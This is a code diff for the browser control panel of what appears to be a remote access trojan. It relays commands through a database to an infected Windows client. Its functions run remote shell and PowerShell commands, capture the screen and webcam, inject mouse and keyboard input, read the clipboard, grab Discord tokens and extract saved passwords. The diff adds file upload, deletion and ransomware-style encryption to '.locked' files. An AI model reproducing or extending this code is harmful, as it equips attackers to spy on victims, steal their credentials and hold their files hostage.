   if(!cmdId){el.innerHTML='<div class="loading">Failed to send</div>';if(errEl){errEl.textContent='No command ID returned';errEl.style.display='block';}return null;}
-  el.innerHTML='<div class="loading"><span class="spinner"></span>Waiting...</div>';
+  el.innerHTML='<div class="loading"><span class="spinner"></span>Waiting for response...</div>';
   for(let i=0;i<30;i++){
    await new Promise(r=>setTimeout(r,200));
    try{
@@ -308,8 +317,8 @@ async function sendAndWait(type,payload,el,errId){
     }
    }catch{}
   }
-  el.innerHTML='<div class="loading">Timeout - no response</div>';
-  if(errEl){errEl.textContent='Client did not respond within 6s';errEl.style.display='block';}
+  el.innerHTML='<div class="loading">Timeout — no response within 6s</div>';
+  if(errEl){errEl.textContent='Client did not respond';errEl.style.display='block';}
   return null;
  }catch(e){el.innerHTML='<div class="loading">Error</div>';if(errEl){errEl.textContent=e.message||'unknown';errEl.style.display='block';}return null;}
 }
@@ -318,7 +327,7 @@ async function runCmd(){
  const input=document.getElementById('cmdInput');
  const cmd=input.value.trim();if(!cmd)return;
  const out=document.getElementById('cmdOutput');
- out.textContent+='> '+cmd+'\n';input.value='';
+ out.textContent+='❯ '+cmd+'\n';input.value='';
  const res=await sendAndWait('cmd',cmd,out,'cmdErr');
  if(res){out.textContent+=(res.result||'(no output)')+'\n';out.scrollTop=out.scrollHeight;}
 }
@@ -326,25 +335,13 @@ async function runCmd(){
 function copyCmdHistory(){
  const t=document.getElementById('cmdOutput').textContent;
  navigator.clipboard.writeText(t).then(()=>{
-  const d=document.createElement('div');d.className='toast';d.textContent='Copied to clipboard';document.body.appendChild(d);
+  const d=document.createElement('div');d.className='toast';d.textContent='✓ Output copied to clipboard';document.body.appendChild(d);
   setTimeout(()=>d.remove(),2000);
  });
 }
 
-async function takeScreenshot(){
- const el=document.getElementById('ssResult');const mon=document.getElementById('monSelect').value;
- const res=await sendAndWait('screenshot',mon,el,'ssErr');
- if(res&&res.result)el.innerHTML='<img class="screenshot" src="data:image/jpeg;base64,'+res.result+'">';
- else if(res)el.innerHTML='<div class="loading">Empty result received</div>';
-}
-
-async function takeWebcam(){
- const el=document.getElementById('wcResult');const errEl=document.getElementById('wcErr');
- errEl.style.display='none';
- const res=await sendAndWait('webcam','',el,'wcErr');
- if(res&&res.result)el.innerHTML='<img class="screenshot" src="data:image/jpeg;base64,'+res.result+'">';
- else if(res)el.innerHTML='<div class="loading">Empty result received</div>';
-}
+async function takeScreenshot(){const el=document.getElementById('ssResult');const mon=document.getElementById('monSelect').value;const res=await sendAndWait('screenshot',mon,el,'ssErr');if(res&&res.result)el.innerHTML='<img class="screenshot" src="data:image/jpeg;base64,'+res.result+'">';else if(res)el.innerHTML='<div class="loading">Empty result</div>';}
+async function takeWebcam(){const el=document.getElementById('wcResult');const errEl=document.getElementById('wcErr');errEl.style.display='none';const res=await sendAndWait('webcam','',el,'wcErr');if(res&&res.result)el.innerHTML='<img class="screenshot" src="data:image/jpeg;base64,'+res.result+'">';else if(res)el.innerHTML='<div class="loading">Empty result</div>';}
 async function grabTokens(){const el=document.getElementById('tokenResult');const errEl=document.getElementById('tokenErr');errEl.style.display='none';const res=await sendAndWait('discord_tokens','',el,'tokenErr');if(res&&res.result)el.innerHTML='<pre style="margin:0;white-space:pre-wrap;word-break:break-all;font-size:.8rem;line-height:1.5">'+escHtml(res.result)+'</pre>';else if(res)el.innerHTML='<div class="loading">No tokens found</div>';}
 function escHtml(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
 
@@ -389,59 +386,25 @@ async function pollScreen(){
    }
   }
  }catch{}
-  setTimeout(pollScreen,100);
+   setTimeout(pollScreen,100);
 }
 
 async function sendLiveConfig(){const q=document.getElementById('liveQuality').value;try{await fetch(FB+'/commands/'+encodeURIComponent(computer)+'.json',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'live_config',payload:JSON.stringify({quality:parseInt(q)}),status:'pending'})});}catch{}}
 
 
-function setupCanvas(){
- const img=document.getElementById('screenImg');const c=document.getElementById('screenCanvas');
- if(!img||!c)return;
- const resize=()=>{c.width=img.clientWidth;c.height=img.clientHeight;c.style.width=img.clientWidth+'px';c.style.height=img.clientHeight+'px';};
- img.onload=resize;setTimeout(resize,100);
-}
-
-function getScreenCoords(e){
- const c=document.getElementById('screenCanvas');const img=document.getElementById('screenImg');
- if(!c||!img)return null;
- const rect=c.getBoundingClientRect();
- const s=screenScale||1;
- return {x:Math.round((e.clientX-rect.left)*img.naturalWidth/c.width/s),y:Math.round((e.clientY-rect.top)*img.naturalHeight/c.height/s)};
-}
-
-async function sendFireForget(type,payload){
- try{await fetch(FB+'/input/'+encodeURIComponent(computer)+'.json',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type,payload:payload||''})});}catch{}
-}
-
-function setupMouseEvents(){
- const c=document.getElementById('screenCanvas');if(!c)return;
- c.style.cursor=mouseOn?'crosshair':'default';
- c.onmousedown=mouseOn?function(e){if(!mouseOn)return;const p=getScreenCoords(e);if(p)sendFireForget('mouse',JSON.stringify({x:p.x,y:p.y,action:'down'}));}:null;
- c.onmouseup=mouseOn?function(e){if(!mouseOn)return;const p=getScreenCoords(e);if(p)sendFireForget('mouse',JSON.stringify({x:p.x,y:p.y,action:'up'}));}:null;
- c.onmousemove=mouseOn?function(e){if(!mouseOn)return;const now=Date.now();if(now-mouseThrottle<50)return;mouseThrottle=now;const p=getScreenCoords(e);if(p)sendFireForget('mouse',JSON.stringify({x:p.x,y:p.y,action:'move'}));}:null;
-}
-
+function setupCanvas(){const img=document.getElementById('screenImg');const c=document.getElementById('screenCanvas');if(!img||!c)return;const resize=()=>{c.width=img.clientWidth;c.height=img.clientHeight;c.style.width=img.clientWidth+'px';c.style.height=img.clientHeight+'px';};img.onload=resize;setTimeout(resize,100);}
+function getScreenCoords(e){const c=document.getElementById('screenCanvas');const img=document.getElementById('screenImg');if(!c||!img)return null;const rect=c.getBoundingClientRect();const s=screenScale||1;return{x:Math.round((e.clientX-rect.left)*img.naturalWidth/c.width/s),y:Math.round((e.clientY-rect.top)*img.naturalHeight/c.height/s)};}
+async function sendFireForget(type,payload){try{await fetch(FB+'/input/'+encodeURIComponent(computer)+'.json',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type,payload:payload||''})});}catch{}}
+function setupMouseEvents(){const c=document.getElementById('screenCanvas');if(!c)return;c.style.cursor=mouseOn?'crosshair':'default';c.onmousedown=mouseOn?function(e){if(!mouseOn)return;const p=getScreenCoords(e);if(p)sendFireForget('mouse',JSON.stringify({x:p.x,y:p.y,action:'down'}));}:null;c.onmouseup=mouseOn?function(e){if(!mouseOn)return;const p=getScreenCoords(e);if(p)sendFireForget('mouse',JSON.stringify({x:p.x,y:p.y,action:'up'}));}:null;c.onmousemove=mouseOn?function(e){if(!mouseOn)return;const now=Date.now();if(now-mouseThrottle<50)return;mouseThrottle=now;const p=getScreenCoords(e);if(p)sendFireForget('mouse',JSON.stringify({x:p.x,y:p.y,action:'move'}));}:null;}
 function toggleMouse(){mouseOn=!mouseOn;const btn=document.getElementById('mouseBtn');btn.textContent=mouseOn?'ON':'OFF';btn.classList.toggle('active-toggle',mouseOn);setupMouseEvents();}
 function toggleKeyboard(){keyOn=!keyOn;const btn=document.getElementById('keyBtn');btn.textContent=keyOn?'ON':'OFF';btn.classList.toggle('active-toggle',keyOn);}
-
 document.addEventListener('keydown',function(e){if(!keyOn)return;if(e.target.tagName==='INPUT'||e.target.tagName==='TEXTAREA')return;e.preventDefault();sendFireForget('keyboard',JSON.stringify({key:e.keyCode,action:'down'}));});
 document.addEventListener('keyup',function(e){if(!keyOn)return;if(e.target.tagName==='INPUT'||e.target.tagName==='TEXTAREA')return;e.preventDefault();sendFireForget('keyboard',JSON.stringify({key:e.keyCode,action:'up'}));});
-
-function stopScreen(){
- screenInterval=false;
- document.getElementById('screenStartBtn').style.display='';document.getElementById('screenStopBtn').style.display='none';
- document.getElementById('screenFps').textContent='';
- document.getElementById('screenResult').innerHTML='<div class="loading">Stopped</div>';
- if(mouseOn)toggleMouse();if(keyOn)toggleKeyboard();
-}
+function stopScreen(){screenInterval=false;document.getElementById('screenStartBtn').style.display='';document.getElementById('screenStopBtn').style.display='none';document.getElementById('screenFps').textContent='';document.getElementById('screenResult').innerHTML='<div class="loading">Stopped</div>';if(mouseOn)toggleMouse();if(keyOn)toggleKeyboard();}
 
 let filePath='',fileLoading=false;
 
-(async function initMonitors(){
- const sel=document.getElementById('monSelect');
- if(sel)sel.innerHTML='<option value="0">Monitor 1</option><option value="-1">All Monitors</option>';
-})();
+(async function initMonitors(){const sel=document.getElementById('monSelect');if(sel)sel.innerHTML='<option value="0">Monitor 1</option><option value="-1">All Monitors</option>';})();
 
 async function browseDir(path){
  if(fileLoading)return;fileLoading=true;
@@ -451,7 +414,7 @@ async function browseDir(path){
  el.innerHTML='<div class="loading"><span class="spinner"></span>Loading...</div>';
  const res=await sendAndWait('file_list',path,el,'filesErr');
  if(res&&res.result){filePath=path||'';renderFiles(res.result);}
- else if(res===null){el.innerHTML='<div class="loading">No response - is the client running?</div>';}
+ else if(res===null){el.innerHTML='<div class="loading">No response — is the client running?</div>';}
  fileLoading=false;
 }
 
@@ -466,13 +429,77 @@ function renderFiles(json){
  entries.forEach(e=>{
   const nm=e.n||'?';const isDir=e.d===true||e.d==='true';const sz=e.s||0;const dt=e.m||'';
   const szStr=sz<1024?sz+' B':sz<1048576?(sz/1024).toFixed(1)+' KB':(sz/1048576).toFixed(1)+' MB';
-  html+='<div class="entry'+(isDir?' dir':'')+'" onclick="'+(isDir?"browseDir('"+uenc(filePath+nm+'\\')+"')":'')+'">';
-  html+='<div class="ico '+(isDir?'folder':'file')+'">'+(isDir?'[D]':'[F]')+'</div>';
-  html+='<div class="nm">'+esc(nm)+'</div>';
+  const fp=filePath+nm;
+  html+='<div class="entry'+(isDir?' dir':'')+'">';
+  html+='<div class="ico '+(isDir?'folder':'file')+'" onclick="'+(isDir?"browseDir('"+uenc(fp+'\\')+"')":'')+'">'+(isDir?'📁':'📄')+'</div>';
+  html+='<div class="nm" onclick="'+(isDir?"browseDir('"+uenc(fp+'\\')+"')":'')+'">'+esc(nm)+'</div>';
   html+=isDir?'<div class="sz"></div>':'<div class="sz">'+szStr+'</div>';
-  html+='<div class="dt">'+esc(dt)+'</div></div>';
+  html+='<div class="dt">'+esc(dt)+'</div>';
+  if(!isDir){
+   html+='<div class="acts">';
+   html+='<button class="btn btn-ghost btn-xs" onclick="fileRename(\''+escAttr(nm)+'\')" title="Rename">✏️</button>';
+   html+='<button class="btn btn-ghost btn-xs" onclick="fileDeleteOp(\''+escAttr(fp)+'\')" title="Delete">🗑️</button>';
+   html+='<button class="btn btn-ghost btn-xs" onclick="fileEncryptOp(\''+escAttr(fp)+'\')" title="Encrypt">🔒</button>';
+   if(nm.endsWith('.locked'))html+='<button class="btn btn-ghost btn-xs" onclick="fileDecryptOp(\''+escAttr(fp)+'\')" title="Decrypt">🔓</button>';
+   html+='</div>';
+  }else{
+   html+='<div class="acts"><button class="btn btn-ghost btn-xs" onclick="fileRename(\''+escAttr(nm)+'\')" title="Rename">✏️</button>';
+   html+='<button class="btn btn-ghost btn-xs" onclick="fileDeleteOp(\''+escAttr(fp)+'\')" title="Delete">🗑️</button></div>';
+  }
+  html+='</div>';
  });
  el.innerHTML=html;
+}
+
+async function fileDeleteOp(path){
+ if(!confirm('Delete "'+path.split('\\').pop()+'"?'))return;
+ const el=document.getElementById('filesBrowser');const errEl=document.getElementById('filesErr');
+ errEl.style.display='none';el.innerHTML='<div class="loading">Deleting...</div>';
+ const res=await sendAndWait('file_delete',path,el,'filesErr');
+ if(res)refreshFiles();
+}
+async function fileRename(name){
+ const newName=prompt('New name:',name);if(!newName||newName===name)return;
+ const path=filePath+name;
+ const el=document.getElementById('filesBrowser');const errEl=document.getElementById('filesErr');
+ errEl.style.display='none';el.innerHTML='<div class="loading">Renaming...</div>';
+ const res=await sendAndWait('file_rename',JSON.stringify({path,name:newName}),el,'filesErr');
+ if(res)refreshFiles();
+}
+async function fileEncryptOp(path){
+ if(!confirm('Encrypt "'+path.split('\\').pop()+'"? This will replace the file with a .locked version.'))return;
+ const el=document.getElementById('filesBrowser');const errEl=document.getElementById('filesErr');
+ errEl.style.display='none';el.innerHTML='<div class="loading">Encrypting...</div>';
+ const res=await sendAndWait('file_encrypt',path,el,'filesErr');
+ if(res)refreshFiles();
+}
+async function fileDecryptOp(path){
+ if(!confirm('Decrypt "'+path.split('\\').pop()+'"? This will restore the original file.'))return;
+ const el=document.getElementById('filesBrowser');const errEl=document.getElementById('filesErr');
+ errEl.style.display='none';el.innerHTML='<div class="loading">Decrypting...</div>';
+ const res=await sendAndWait('file_decrypt',path,el,'filesErr');
+ if(res)refreshFiles();
+}
+function refreshFiles(){if(filePath)browseDir(filePath);else browseDir('');}
+async function uploadFile(file){
+ const path=filePath+file.name;
+ const reader=new FileReader();
+ reader.onload=async function(e){
+  const base64=e.target.result.split(',')[1];
+  const el=document.getElementById('filesBrowser');const errEl=document.getElementById('filesErr');
+  errEl.style.display='none';el.innerHTML='<div class="loading">Uploading '+esc(file.name)+'...</div>';
+  const res=await sendAndWait('file_upload',JSON.stringify({path,data:base64}),el,'filesErr');
+  if(res)refreshFiles();
+ };
+ reader.readAsDataURL(file);
+}
+function handleDrop(e){
+ e.preventDefault();document.getElementById('dropZone').classList.remove('drag-over');
+ for(let f of e.dataTransfer.files)uploadFile(f);
+}
+function handleFilePick(input){
+ for(let f of input.files)uploadFile(f);
+ input.value='';
 }
 
 async function sendSystemCmd(type){
@@ -480,29 +507,14 @@ async function sendSystemCmd(type){
  err.style.display='none';
  if(type==='shutdown'||type==='restart'){if(!confirm('Confirm '+type+'?'))return}
  const res=await sendAndWait(type,'',el,'sysErr');
- if(res)el.innerHTML='<div style="color:#3fb950">OK: '+type+'</div>';
+ if(res)el.innerHTML='<div style="color:#4ade80">✓ '+type+' executed</div>';
 }
-
-function showMsgBox(){
- const t=prompt('Message text:');if(!t)return;
- const ti=prompt('Title:','Remote');
- const el=document.getElementById('sysResult');
- el.innerHTML='<div class="loading"><span class="spinner"></span>Sending...</div>';
- sendAndWait('msgbox',JSON.stringify({text:t,title:ti||'Remote'}),el,'sysErr').then(r=>{if(r)el.innerHTML='<div style="color:#3fb950">Message sent</div>';});
-}
-
+function showMsgBox(){const t=prompt('Message text:');if(!t)return;const ti=prompt('Title:','Remote');const el=document.getElementById('sysResult');el.innerHTML='<div class="loading"><span class="spinner"></span>Sending...</div>';sendAndWait('msgbox',JSON.stringify({text:t,title:ti||'Remote'}),el,'sysErr').then(r=>{if(r)el.innerHTML='<div style="color:#4ade80">✓ Message sent</div>';});}
 function setVolume(v){document.getElementById('volVal').textContent=v;}
 async function getClipboardText(){const el=document.getElementById('sysResult');const res=await sendAndWait('clipboard','',el,'sysErr');if(res)el.innerHTML='Clipboard: '+esc(res.result);}
 async function getIdleTime(){const el=document.getElementById('sysResult');const res=await sendAndWait('idle','',el,'sysErr');if(res)el.innerHTML='Idle time: '+esc(res.result)+' seconds';}
 async function getUptime(){const el=document.getElementById('sysResult');const res=await sendAndWait('uptime','',el,'sysErr');if(res)el.innerHTML='Uptime: '+esc(res.result)+' seconds ('+Math.floor(parseInt(res.result)/3600)+'h)';}
-
-async function runPowerShell(){
- const cmd=document.getElementById('psInput').value.trim();if(!cmd)return;
- const el=document.getElementById('sysResult');const err=document.getElementById('sysErr');
- err.style.display='none';el.innerHTML='<div class="loading"><span class="spinner"></span>Running...</div>';
- const res=await sendAndWait('powershell',cmd,el,'sysErr');
- if(res)el.innerHTML='<pre style="white-space:pre-wrap;margin:0">'+esc(res.result)+'</pre>';
-}
+async function runPowerShell(){const cmd=document.getElementById('psInput').value.trim();if(!cmd)return;const el=document.getElementById('sysResult');const err=document.getElementById('sysErr');err.style.display='none';el.innerHTML='<div class="loading"><span class="spinner"></span>Running...</div>';const res=await sendAndWait('powershell',cmd,el,'sysErr');if(res)el.innerHTML='<pre style="white-space:pre-wrap;margin:0">'+esc(res.result)+'</pre>';}
 
 async function loadSysInfo(){
  const el=document.getElementById('sysResult');const err=document.getElementById('sysErr');
@@ -517,47 +529,19 @@ async function loadSysInfo(){
    html+='<div class="sysinfo-card"><div class="val">'+(d.ram/1024).toFixed(1)+' GB</div><div class="lbl">Total RAM</div></div>';
    html+='<div class="sysinfo-card"><div class="val">'+(d.ram_free/1024).toFixed(1)+' GB</div><div class="lbl">Free RAM</div></div>';
    if(d.disks&&d.disks.length){d.disks.forEach(dk=>{const pct=((dk.t-dk.f)/dk.t*100).toFixed(0);html+='<div class="sysinfo-card"><div class="val">'+dk.d+': '+(dk.f/1024).toFixed(1)+' GB</div><div class="lbl">Free of '+(dk.t/1024).toFixed(1)+' GB</div><div class="disk-bar"><div class="fill" style="width:'+pct+'%"></div></div></div>';});}
-   cards.innerHTML=html;el.innerHTML='<div style="color:#3fb950">System info loaded</div>';
+   cards.innerHTML=html;el.innerHTML='<div style="color:#4ade80">✓ System info loaded</div>';
   }catch(e){el.innerHTML='<div class="loading">Parse error</div>';}
  }
 }
 
-async function loadPasswords(){
- const el=document.getElementById('pwResult');const err=document.getElementById('pwErr');
- err.style.display='none';el.innerHTML='<div class="loading"><span class="spinner"></span>Extracting...</div>';
- const res=await sendAndWait('passwords','',el,'pwErr');
- if(res&&res.result){el.innerHTML='<pre style="white-space:pre-wrap;margin:0">'+esc(res.result)+'</pre>';const d=document.createElement('div');d.className='toast';d.textContent='Passwords extracted';document.body.appendChild(d);setTimeout(()=>d.remove(),2000);}
-}
-
+async function loadPasswords(){const el=document.getElementById('pwResult');const err=document.getElementById('pwErr');err.style.display='none';el.innerHTML='<div class="loading"><span class="spinner"></span>Extracting passwords...</div>';const res=await sendAndWait('passwords','',el,'pwErr');if(res&&res.result){el.innerHTML='<pre style="white-space:pre-wrap;margin:0">'+esc(res.result)+'</pre>';const d=document.createElement('div');d.className='toast';d.textContent='✓ Passwords extracted';document.body.appendChild(d);setTimeout(()=>d.remove(),2000);}}
 async function loadNetworkInfo(){const el=document.getElementById('netResult');const err=document.getElementById('netErr');err.style.display='none';el.innerHTML='<div class="loading"><span class="spinner"></span>Gathering network info...</div>';const res=await sendAndWait('network_info','',el,'netErr');if(res&&res.result)el.innerHTML='<pre style="white-space:pre-wrap;margin:0">'+esc(res.result)+'</pre>';}
 async function loadServices(){const el=document.getElementById('svcResult');const err=document.getElementById('svcErr');err.style.display='none';el.innerHTML='<div class="loading"><span class="spinner"></span>Listing services...</div>';const res=await sendAndWait('services','',el,'svcErr');if(res&&res.result){el.innerHTML='<pre style="white-space:pre-wrap;margin:0">'+esc(res.result)+'</pre>';const lines=res.result.split('\n').filter(l=>l.includes('SERVICE_NAME')||l.includes('DISPLAY_NAME')||l.includes('STATE'));document.getElementById('svcCount').textContent='~'+lines.length+' services';}}
 async function loadInstalledApps(){const el=document.getElementById('appResult');const err=document.getElementById('appErr');err.style.display='none';el.innerHTML='<div class="loading"><span class="spinner"></span>Listing installed apps...</div>';const res=await sendAndWait('installed_apps','',el,'appErr');if(res&&res.result)el.innerHTML='<pre style="white-space:pre-wrap;margin:0">'+esc(res.result)+'</pre>';}
 
-async function loadProcesses(){
- const el=document.getElementById('procResult');const errEl=document.getElementById('procErr');
- errEl.style.display='none';el.innerHTML='<div class="loading"><span class="spinner"></span>Loading processes...</div>';
- const res=await sendAndWait('process_list','',el,'procErr');
- if(res&&res.result){renderProcesses(res.result);}else if(res){el.innerHTML='<div class="loading">Empty result received</div>';}
-}
-
-function renderProcesses(json){
- const el=document.getElementById('procResult');
- let entries;try{entries=JSON.parse(json)}catch{el.innerHTML='<div class="loading">Parse error: '+esc(json.substring(0,100))+'</div>';return}
- if(!Array.isArray(entries)){el.innerHTML='<div class="loading">Bad response format</div>';return}
- document.getElementById('procCount').textContent=entries.length+' processes';
- if(!entries.length){el.innerHTML='<div class="loading">No processes found</div>';return}
- let html='<table class="proc-table"><thead><tr><th>Process Name</th><th>PID</th><th></th></tr></thead><tbody>';
- entries.forEach(e=>{const nm=e.n||'?';const pid=e.p||0;html+='<tr><td class="pname">'+esc(nm)+'</td><td class="pid">'+pid+'</td><td class="pkill"><button class="btn btn-danger btn-sm" onclick="killProc('+pid+',\''+uenc(nm)+'\')">Kill</button></td></tr>';});
- html+='</tbody></table>';el.innerHTML=html;
-}
-
-async function killProc(pid,name){
- try{name=decodeURIComponent(name)}catch{}
- if(!confirm('Kill '+name+' (PID: '+pid+')?'))return;
- const el=document.getElementById('procResult');
- const res=await sendAndWait('kill_process',String(pid),el,'procErr');
- if(res&&res.result==='ok'){loadProcesses();}else if(res){alert('Failed: '+res.result);}
-}
+async function loadProcesses(){const el=document.getElementById('procResult');const errEl=document.getElementById('procErr');errEl.style.display='none';el.innerHTML='<div class="loading"><span class="spinner"></span>Loading processes...</div>';const res=await sendAndWait('process_list','',el,'procErr');if(res&&res.result){renderProcesses(res.result);}else if(res){el.innerHTML='<div class="loading">Empty result</div>';}}
+function renderProcesses(json){const el=document.getElementById('procResult');let entries;try{entries=JSON.parse(json)}catch{el.innerHTML='<div class="loading">Parse error</div>';return}if(!Array.isArray(entries)){el.innerHTML='<div class="loading">Bad response</div>';return}document.getElementById('procCount').textContent=entries.length+' processes';if(!entries.length){el.innerHTML='<div class="loading">No processes</div>';return}let html='<table class="proc-table"><thead><tr><th>Process</th><th>PID</th><th></th></tr></thead><tbody>';entries.forEach(e=>{const nm=e.n||'?';const pid=e.p||0;html+='<tr><td class="pname">'+esc(nm)+'</td><td class="pid">'+pid+'</td><td class="pkill"><button class="btn btn-danger btn-sm" onclick="killProc('+pid+',\''+uenc(nm)+'\')">Kill</button></td></tr>';});html+='</tbody></table>';el.innerHTML=html;}
+async function killProc(pid,name){try{name=decodeURIComponent(name)}catch{}if(!confirm('Kill '+name+' (PID: '+pid+')?'))return;const el=document.getElementById('procResult');const res=await sendAndWait('kill_process',String(pid),el,'procErr');if(res&&res.result==='ok'){loadProcesses();}else if(res){alert('Failed: '+res.result);}}
 
 function esc(t){const d=document.createElement('div');d.textContent=t;return d.innerHTML}
 function uenc(t){return encodeURIComponent(t).replace(/'/g,'%27')}
